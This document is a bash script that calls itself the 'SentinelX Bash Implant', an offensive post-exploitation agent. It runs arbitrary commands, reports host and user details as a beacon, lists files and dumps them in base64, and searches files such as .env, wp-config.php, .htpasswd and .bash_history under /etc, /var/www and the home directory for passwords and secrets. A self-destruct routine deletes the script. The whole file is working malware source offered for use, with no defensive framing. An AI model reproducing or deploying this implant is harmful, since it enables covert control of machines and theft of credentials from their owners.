#!/bin/bash
# SentinelX Bash Implant
AUTH_KEY="sentinelx_2024"
C2_URL=""

beacon() {
    cat <<'EOF'
{"status":"ok","data":{"hostname":"EOF
    hostname
    cat <<'EOF'
","os":EOF
    uname -s -r | awk '{print "\""$0"\""}'
    cat <<'EOF'
,"user":"EOF
    whoami
    cat <<'EOF'
","cwd":"EOF
    pwd
    cat <<'EOF'
","shell":"bash"}}
EOF
}

exec_cmd() {
    local out
    out=$($@ 2>&1)
    echo "{\"status\":\"ok\",\"output\":$(echo "$out" | python3 -c "import sys,json; print(json.dumps(sys.stdin.read()))" 2>/dev/null || echo "\"$out\""),\"cwd\":\"$(pwd)\"}"
}

file_list() {
    local path="${1:-.}"
    echo '{"status":"ok","items":['
    local first=1
    for e in "$path"/*; do
        [ "$first" -eq 1 ] && first=0 || echo ','
        local type="file"; [ -d "$e" ] && type="dir"
        local size=$(stat -c%s "$e" 2>/dev/null || echo 0)
        local name=$(basename "$e")
        echo "{\"name\":$(echo "$name" | python3 -c "import sys,json; print(json.dumps(sys.stdin.read().strip()))" 2>/dev/null || echo "\"$name\""),\"type\":\"$type\",\"size\":$size}"
    done
    echo "],\"path\":\"$(realpath "$path" 2>/dev/null || echo "$path")\"}"
}

file_read() {
    local f="$1"
    if [ -f "$f" ]; then
        local content=$(base64 -w0 "$f" 2>/dev/null || base64 "$f" 2>/dev/null)
        echo "{\"status\":\"ok\",\"content\":\"$content\"}"
    else
        echo '{"status":"error","message":"File not found"}'
    fi
}

password_hunt() {
    local hits=""
    local files=".env config.php wp-config.php .htpasswd .my.cnf .bash_history"
    local roots="$(pwd) /var/www /etc ~"
    for root in $roots; do
        for f in $files; do
            local fp="$root/$f"
            [ -f "$fp" ] || continue
            while IFS= read -r line; do
                if echo "$line" | grep -qiE "password|pass|secret|key|db_pass"; then
                    hits="$hits{\"file\":\"$fp\",\"match\":\"$(echo "$line" | head -c200 | sed 's/"/\\"/g')\"},"
                fi
            done < "$fp"
        done
    done
    hits="${hits%,}"
    echo "{\"status\":\"ok\",\"hits\":[$hits],\"count\":$(echo "$hits" | grep -c "file" 2>/dev/null || echo 0)}"
}

self_destruct() {
    rm -f "$0"
    echo '{"status":"ok"}'
}

action="${1:-beacon}"
shift 2>/dev/null || true

case "$action" in
    beacon) beacon;;
    exec) exec_cmd "$@";;
    file_list) file_list "$1";;
    file_read) file_read "$1";;
    password_hunt) password_hunt;;
    self_destruct) self_destruct;;
    *) echo '{"status":"error","message":"Unknown action"}';;
esac
